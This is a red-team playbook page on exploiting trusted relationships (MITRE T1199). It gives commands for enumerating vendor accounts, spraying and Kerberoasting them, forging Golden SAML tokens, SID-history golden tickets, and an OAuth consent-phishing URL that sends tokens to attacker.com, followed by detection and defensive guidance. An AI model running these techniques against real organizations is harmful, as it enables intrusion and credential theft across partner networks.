# Trusted Relationship Exploitation

> **MITRE ATT&CK**: Initial Access > T1199 - Trusted Relationship
> **Platforms**: Windows (Active Directory), Cloud (Azure AD, AWS), Network Infrastructure
> **Required Privileges**: Varies (vendor credentials, federated access, trust configuration access)
> **OPSEC Risk**: Medium (legitimate trust channels make detection difficult)

## Strategic Overview

Trusted relationships are the invisible bridges between organizations, and they represent
some of the most dangerous attack paths in modern environments. Every MSP connection, vendor
VPN, federation trust, and OAuth integration extends the attack surface beyond the
organization's direct control. The Red Team Lead must recognize that trusted relationships
are force multipliers: compromising a single MSP can yield access to hundreds of client
environments, and abusing a federation trust can bypass the target's entire authentication
infrastructure. These relationships are particularly dangerous because the traffic they
generate is expected and legitimate by design -- a managed service provider connecting to
client systems is normal operations, not an indicator of compromise. During the
reconnaissance phase, identifying all third-party access points is critical. During
exploitation, these trust relationships often provide the path of least resistance because
security controls at trust boundaries are frequently weaker than perimeter defenses.

## Technical Deep-Dive

### MSP/Vendor Access Exploitation

```bash
# Managed Service Provider access typically includes:
# - VPN tunnel with persistent connectivity
# - Remote management tools (ConnectWise, Datto, Kaseya)
# - Service accounts in client Active Directory
# - Shared administrative credentials across multiple clients
# - Jump boxes or bastion hosts with access to client networks

# Reconnaissance of MSP access
# Identify MSP relationships from:
# - Vendor risk assessments (if accessible)
# - Network segmentation reviews (VPN tunnels, site-to-site connections)
# - Service accounts with vendor-related naming (svc-vendorname, msp-admin)
# - Firewall rules allowing specific external IP ranges
# - RMM (Remote Monitoring and Management) agent installations

# CrackMapExec to identify MSP service accounts
crackmapexec smb 10.10.10.50 -u 'user' -p 'password' -d domain.local \
  --users | grep -i "svc\|msp\|vendor\|partner"

# LDAP query for third-party service accounts
ldapsearch -x -H ldap://10.10.10.50 -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(|(cn=*svc*)(cn=*vendor*)(cn=*msp*)(cn=*partner*)))" \
  sAMAccountName description memberOf lastLogonTimestamp

# Identify RMM tools installed on endpoints
# Look for processes: ScreenConnect, ConnectWise, TeamViewer, AnyDesk,
# Datto, Kaseya, NinjaRMM, Atera, Splashtop
wmic process list brief | findstr /i "screenconnect teamviewer anydesk kaseya"
```

### VPN Credential Compromise

```bash
# VPN access is the most common trust relationship vector

# Step 1: Identify VPN solution
# - Recon reveals VPN endpoints (GlobalProtect, Pulse Secure, Cisco AnyConnect)
# - SSL certificate analysis reveals VPN vendor
# - Shodan: "ssl.cert.subject.CN:vpn.target.com"

# Step 2: Obtain VPN credentials
# - Password spraying against VPN portal (see password-attacks.md)
# - Credential stuffing from breach data
# - Phishing for VPN credentials (Evilginx2 with VPN phishlet)
# - Exploiting VPN appliance vulnerabilities (see external-remote-services.md)

# Step 3: Connect and pivot
# - VPN connection places attacker on internal network
# - Often lands in a minimally segmented network zone
# - Begin internal reconnaissance from VPN DHCP-assigned address

# Vendor VPN specific considerations:
# - Vendor VPNs often have broader access than employee VPNs
# - Split-tunnel vs full-tunnel affects what traffic is visible to defenders
# - Vendor accounts may not be subject to the same MFA requirements
# - Vendor VPN sessions may not generate the same alerts as employee logins
```

### Federation Trust Abuse (SAML)

```bash
# SAML (Security Assertion Markup Language) federation allows SSO across organizations

# Golden SAML Attack (post-compromise technique)
# If you compromise the AD FS token signing certificate, you can forge SAML tokens
# for any federated service (O365, AWS, Salesforce, etc.)

# Step 1: Extract AD FS token signing certificate
# Requires DA or AD FS server admin access
mimikatz # lsadump::dcsync /user:ADFS$ /domain:domain.local
# Or export from AD FS configuration database

# Step 2: Forge SAML token with ADFSDump + ADFSSpoof
python3 ADFSDump.py -d domain.local -u admin -p password -s adfs.domain.local
python3 ADFSSpoof.py -b /path/to/extracted/blob -s adfs.domain.local \
  -e user@target.com -c https://signin.aws.amazon.com/saml

# Step 3: Use forged SAML assertion to access federated services
# Submit forged SAML response to service provider's ACS URL
# Gain access as any user in the federated organization

# Azure AD federation trust abuse
# If target federates with Azure AD, compromising the on-prem AD FS
# grants access to all Azure AD-connected cloud resources

# Detection gap: Forged SAML tokens are cryptographically valid
# because they are signed with the legitimate token signing certificate
```

### OAuth / OpenID Connect Exploitation

```bash
# OAuth consent phishing (illicit consent grant)
# Attacker registers a malicious Azure AD application
# Sends target a consent URL requesting excessive permissions:
# - Mail.Read, Mail.Send (email access)
# - Files.ReadWrite.All (OneDrive/SharePoint access)
# - User.Read.All (directory enumeration)

# Consent URL example:
# https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?
#   client_id={malicious_app_id}&
#   response_type=code&
#   redirect_uri=https://attacker.com/callback&
#   scope=Mail.Read+Mail.Send+Files.ReadWrite.All

# Once user consents, attacker receives OAuth tokens with granted permissions
# No password or MFA required after initial consent

# Token theft via OAuth code interception
# If redirect_uri validation is weak, attacker can intercept authorization codes
# Open redirect + OAuth = token theft

# Azure AD application permission escalation
# Find applications with excessive permissions
az ad app list --query "[?requiredResourceAccess[?resourceAccess[?type=='Role']]]" \
  --output table

# Check for applications with application-level (not delegated) permissions
# Application permissions do not require user context and are more powerful
```

### Partner Network Pivoting

```bash
# Active Directory trust relationships enable cross-domain access

# Enumerate AD trusts
nltest /domain_trusts /all_trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()

# BloodHound trust enumeration
SharpHound.exe --CollectionMethods Trusts,ACL --Domain partner.local

# Trust types and their implications:
# Parent-Child: Automatic two-way transitive trust (full access)
# Tree-Root: Two-way transitive between trees in the same forest
# External: One-way or two-way, non-transitive (limited)
# Forest: One-way or two-way, transitive across forest boundaries
# Shortcut: Speeds authentication, follows existing trust paths

# Cross-domain attack via SID History injection
# If trust has SID filtering disabled:
mimikatz # kerberos::golden /user:admin /domain:current.local \
  /sid:S-1-5-21-CURRENT-DOMAIN-SID /krbtgt:HASH \
  /sids:S-1-5-21-TRUSTED-DOMAIN-SID-519 /ptt

# Access resources across trust boundaries
dir \\partner-dc.partner.local\c$
```

### Shared Service Account Abuse

```bash
# Service accounts shared between organizations are high-value targets

# Discovery via LDAP
ldapsearch -x -H ldap://10.10.10.50 -D "user@domain.local" -w 'password' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*)(description=*vendor*))" \
  sAMAccountName servicePrincipalName description memberOf

# Common shared service account patterns:
# - Same password across multiple client environments
# - Excessive privileges (Domain Admin "for convenience")
# - No MFA enforcement (service accounts exempt from CA policies)
# - Password never expires (no rotation policy)
# - Credentials stored in documentation, wikis, or ticketing systems

# If a vendor service account password is obtained:
# Test it against all known client environments of that vendor
crackmapexec smb client-subnet/24 -u 'vendor-svc' -p 'VendorPass123!' -d domain.local

# Kerberoasting vendor service accounts
GetUserSPNs.py domain.local/user:password -request -dc-ip 10.10.10.50 \
  | grep -i vendor
```

### Trust Relationship Discovery During Recon

```bash
# External reconnaissance for trust relationships
# 1. DNS records revealing partner domains
dig MX target.com +short           # Shared mail infrastructure
dig TXT target.com +short          # SPF includes partner mail servers

# 2. Certificate transparency for partner domains
curl -s "https://crt.sh/?q=%25.target.com&output=json" | \
  jq -r '.[].name_value' | grep -i "partner\|vendor\|msp"

# 3. LinkedIn/job postings revealing technology partners
# "We use ConnectWise/Datto/Kaseya for managed services"
# "Experience with [specific vendor] integration required"

# 4. Public breach data for vendor credentials
# Vendor employees reusing passwords across client portals

# 5. Azure AD tenant enumeration for federation
# Check if target federates with external identity providers
curl -s "https://login.microsoftonline.com/{tenant}/.well-known/openid-configuration"
```

## Detection & Evasion

### What Defenders See
- VPN connections from vendor IP ranges (expected traffic)
- Service account authentications during off-hours (anomalous timing)
- Cross-domain authentication events (Event ID 4769 with foreign realm)
- OAuth consent grants for new applications (Azure AD audit logs)
- AD FS authentication events for unusual users/services
- RMM tool connections from unexpected source IPs

### Why Trust Exploitation Is Difficult to Detect
- Traffic traverses established, expected communication channels
- Service accounts authenticate legitimately using valid credentials
- Federation trust traffic uses cryptographically valid tokens
- Vendor access is explicitly allowed by firewall rules and access policies
- SOC teams often exclude vendor traffic from alert rules to reduce noise

### Defensive Recommendations
- Implement zero-trust architecture for all vendor/partner access
- Require MFA for all external trust relationships without exception
- Monitor service account authentication for anomalous patterns
- Audit OAuth application consent grants regularly
- Rotate AD FS token signing certificates periodically
- Enable SID filtering on all external and forest trusts
- Segment vendor access to only required resources (least privilege)
- Log and alert on cross-domain authentication events

## Cross-References

- **Passive Recon** (01-reconnaissance/passive-recon.md) -- identify vendor relationships via OSINT
- **LDAP Enumeration** (01-reconnaissance/ldap-enumeration.md) -- discover trust configurations and service accounts
- **Password Attacks** (02-initial-access/password-attacks.md) -- spray vendor/partner accounts
- **External Remote Services** (02-initial-access/external-remote-services.md) -- vendor VPN exploitation
- **Supply Chain** (02-initial-access/supply-chain.md) -- MSP compromise is a supply chain attack variant

## References

- MITRE ATT&CK T1199: https://attack.mitre.org/techniques/T1199/
- Golden SAML: https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps
- ADFSSpoof: https://github.com/mandiant/ADFSDump
- OAuth Consent Phishing: https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-app-consent
- CISA MSP Security Guidance: https://www.cisa.gov/msp
- AD Trust Documentation: https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust
